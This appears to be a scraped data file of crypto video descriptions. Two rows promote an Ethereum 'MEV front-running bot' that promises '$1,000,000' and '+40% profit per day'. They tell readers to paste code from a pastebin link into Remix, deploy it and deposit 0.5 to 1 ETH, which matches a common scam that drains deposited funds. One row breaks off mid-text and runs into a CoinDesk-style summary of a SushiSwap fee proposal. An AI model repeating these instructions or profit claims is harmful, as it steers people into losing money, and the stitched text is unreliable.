$1,000,000 using the Ethereum trading bot! You can too!,"If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.You can message me on Telegram if you have any questions: https://t.me/mevbot_solidityCODE LINK : https://pastebin.com/raw/pCrwhFP7STEP BY STEP Instructions ::backhand index pointing right: Download MetaMask: https://metamask.io/download:backhand index pointing right: Access the Remix IDE: https://remixide.org:backhand index pointing right: Right click on the 'contracts' folder and create a new file. Rename it as you like—i.e., 'Bot.sol':backhand index pointing right: Paste THIS code in Remix: https://pastebin.com/raw/pCrwhFP7:backhand index pointing right: Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile':backhand index pointing right: Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now:backhand index pointing right: Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address:backhand index pointing right: After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal':police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.#mev #ethereum #botBNB, BINANCE, FTX, BLOCKFI, USDT, POLYGON, MATIC, QUICKSWAP, Uniswap, trading bot, staking rewards, cryptocurrency, Bitcoin, ethereum, how to make money on Uniswap, Sushiswap, SundaeSwap, PancakeSwap, stake Ethereum, how to make money online, front-running bot, front-run bot, passive income, crypto passive income, earning passive income with crypto, cryptocurrency passive income 2023, ETH trading bot, Uniswap bot 2023, ETH trader, make money online, Uniswap V2, liquidity, Ether, crypto passive income strategies, Arbitrage bot, arbitrage, MEV, MEV bot, Maximal Extractable Value, SundaeSwap, masternodes passive income, Uniswap V2, liquidity bot, slippage bot, slippage, crypto ethereum, ethereum price, ethereum news, solidity, ethereum support and resistance, crypto arbitrage, ethereum prediction, how to earn 1000$/Day, sniping bot, DeFi, yield farming, crypto trading, cryptocurrency investment, crypto wallet, altcoins, Binance, Coinbase, decentralized finance, DEX, gas fees, crypto mining, NFT, crypto art, blockchain technology, crypto news, stablecoins, USDT, USDC, Tether, decentralized finance, yield farming, crypto wallet, altcoins, gas fees, nft, crypto art, blockchain, binance, coinbase, smart contracts, dex, stablecoins, usdt, usdc, crypto news, crypto, mining, metamask, Etherium, BTC, stake eth, make money on sushi swap, pancakeswap, uniswap front running bot, passive income 2022, how i make passive income with bitcoin, eth trader, how i make daily passive income with ethereum, liquidity bot, how to earn passive income with crypto, earning passive income with crypto, passive income online, masternodes passive income."

+40% Profit Per Day on Uniswap with MEV Bot (Updated V3),"If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. Rename it as you like—i.e., 'Bot.sol':backhand index pointing right: Paste THIS code in Remix: https://pastebin.com/raw/pCrwhFP7:backhand index pointing right: Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile':backhand index pointing right: Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now:backhand index pointing right: Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address:backhand index pointing right: After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal':police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. DeFi Protocol SushiSwap Proposes 'Immediate' Action to Support Its Treasury,"Developers proposed to divert 100% of fees generated on the platform to Sushi’s multisig for one year or until new tokenomics are implemented.SushiSwap, a decentralized finance (DeFi) protocol, is facing a significant deficit in its treasury that threatens its long-term operational viability, according to a governance proposal from project developers.After reviewing expenditures, the project's annual runway requirement was reduced from $9 million to $5 million, but the treasury still provides for only about 18 months of runway, developers said.To address the deficit, lead developer Jared Gray proposed setting Kanpai, a fee-diversion protocol, to 100% of fees diverted to the Treasury multisig for one year, or until new token distribution and reward schemes are implemented.The proposal is a temporary solution to a long-term problem, and new tokenomics will take time to implement, developers said.Community members showed mixed reactions to the proposal. Some said that depriving users of the “fees they are entitled to” felt like a breach of the project’s primary objections, while others criticized the “sensationalized” tone used by developers to highlight the urgency of the situation.Developers, however, maintain that the proposal is to ensure the long-term operations of SushiSwap.“Bear market environments present multiple challenges for projects and teams, and recently we’ve seen many notable projects lay off substantial personnel or go bankrupt,” Gray noted in the proposal.“It makes little sense for Sushi to follow a similar path when it has an opportunity to capture its singular significant source of revenue and direct it back to the treasury for the benefit of all,” he added.The Sushi team had increased its funding by securing several multi-million-dollar partnership deals, Gray said, cautioning that relying on such business development deals is only “part of a successful business model to secure Sushi’s future.”https://www.coindesk.com/tech/2022/12/07/defi-protocol-sushi-proposes-immediate-action-to-support-its-treasury/#crypto #cryptonews #cryptonewstoday #cryptoworld #cryptoworlddaily #defi #definews #definewstoday #sushi #sushinews #sushinewstoday #fees #feesnews #feesnewstoday"
